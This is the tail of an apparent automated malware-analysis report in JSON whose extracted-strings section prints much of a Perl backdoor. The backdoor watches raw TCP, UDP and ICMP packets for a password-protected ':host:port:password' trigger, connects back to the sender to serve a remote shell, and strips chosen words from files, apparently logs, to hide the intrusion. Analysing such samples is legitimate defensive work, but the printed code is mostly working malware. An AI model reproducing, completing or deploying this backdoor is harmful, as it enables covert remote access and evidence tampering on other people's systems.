            "    return(syswrite($shell, $msg, length($msg))) if (defined($shell));",
            "  sub write_client {",
            "     my ($cli, $msg) = @_;",
            "     my $socket = $CLIENT{$cli}->{sock};",
            "     return() if (not defined($socket));",
            "     syswrite($socket, $msg, length($msg));",
            "  sub finish_client {",
            "    my ($cli, $msg) = @_;",
            "    write_client($cli, $msg);",
            "    close_client($cli);",
            "  sub close_client {",
            "    my $cli = shift;",
            "    $connections-- if (defined($CLIENT{$cli})); # no mistakes with the protocol connection",
            "    $sel_serv->remove($cli);",
            "    if (defined($CLIENT{$cli}->{shell})) {",
            "      my $shell = $CLIENT{$cli}->{shell};",
            "      $sel_serv->remove($shell);",
            "      close($shell);",
            "      my $shell_pid = $CLIENT{$cli}->{SHELL_PID};",
            "      kill(9, $shell_pid) if ($shell_pid);",
            "    }",
            "    my $proto = $CLIENT{$cli}->{proto};",
            "    $proto->close() if ($proto);",
            "    $cli->close()   if ($cli);",
            "    delete($CLIENT{$cli});",
            "} # END OF CHILD   ",
            "close(CHILD_RDR);",
            "foreach my $file (keys(%WIPE)) {",
            "  next unless (open(FILE, \"< $file\"));",
            "  unless (open(TMP, \"> /tmp/.aPtmp\")) { # ???",
            "    close(FILE);",
            "    next;",
            "  while (<FILE>) {",
            "    my @wipe_words = split(/ +/ , $WIPE{$file});",
            "    my @line_words = split(/ +/, $_);",
            "    my $skip = 0;",
            "    foreach my $wipe_word (@wipe_words) {",
            "      if (grep { $_ =~ /\\Q$wipe_word\\E/i } @line_words) {",
            "        $skip = 1;",
            "        last;",
            "      }",
            "    }",
            "    next if ($skip == 1);",
            "    print TMP $_;",
            "  close FILE;",
            "  close TMP;",
            "  open(FILE, \"> $file\");",
            "  open(TMP, \"< /tmp/.aPtmp\");",
            "  while(<TMP>) {",
            "    print FILE $_;",
            "  close(FILE);",
            "  close(TMP);",
            "unlink(\"/tmp/.aPtmp\");",
            "while ( 1 ) {",
            "  loop $psck,-1,\\&parse,@p;",
            "#############",
            "# MAIN SUBS #",
            "#############",
            "sub conecta {",
            "  my ($ip, $port) = @_;",
            "  syswrite(PARENT_WTR, \"CONN $ip:$port\\n\");",
            "sub check_pass {",
            "  my $got_pass = shift;",
            "  if (crypt($got_pass, $pass) eq $pass) {",
            "    return($got_pass);",
            "  return(undef);",
            "sub parse {",
            "  my $pkt = $_[2];",
            "  $p->bset(substr($pkt,$offset));",
            "  my ($id,$frg,$ttl,$saddr,$daddr,) =",
            "     $p->get({ip=>['id','frag_off','ttl','saddr','daddr']});",
            "  my $sport = unpack(\"nn\",substr($pkt,$offset+$ip,4));",
            "  my $dport = unpack(\"nn\",substr($pkt,$offset+$ip+2,4));",
            "  my ($udp_icmp_data) = $p->get({udp=>[ 'data']});",
            "  my $tcp_data = substr($pkt,$offset+$ip+(unpack(\"C\",(substr($pkt,$offset+$ip+12,1)))/4));",
            "  my $client_host = sprintf(\"%u.%u.%u.%u\", unpack \"C4\", pack \"N1\", $saddr);",
            "  $daddr = sprintf(\"%u.%u.%u.%u\", unpack \"C4\", pack \"N1\", $daddr);",
            "  my $ok = 0;",
            "  if ($tcp_data =~ /^:(.+?):(\\d+):(.*)/) {",
            "     $client_host = $1 if ($1 ne '');",
            "     my $port = $2;",
            "     my $cli_pass = $3;",
            "     $cli_pass = $okp if (ord($3) == 1);",
            "     if (my $connect = check_pass($cli_pass)) {",
            "       conecta(\"$client_host\", $port);",
            "       $okp = $connect;",
            "       $ok = 1;",
            "     }",
            "  if ($ok == 0 and $udp_icmp_data  =~ /^:(.+?):(\\d+):(.*)/) {",
            "     $client_host = $1 if ($1 ne '');",
            "     my $port = $2;",
            "     my $cli_pass = $3;",
            "     $cli_pass = $okp if (ord($3) == 1);",
            "     if (my $connect = check_pass($cli_pass)) {",
            "       conecta(\"$client_host\", $port);",
            "       $okp = $connect;",
            "       $ok = 1;",
            "     }"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "  # i like the wget look so i based this function on it :)"
            ]
        },
        "ip": [],
        "url": [
            "http://",
            "ftp://"
        ]
    },
    "time": "0:00:00.605289",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
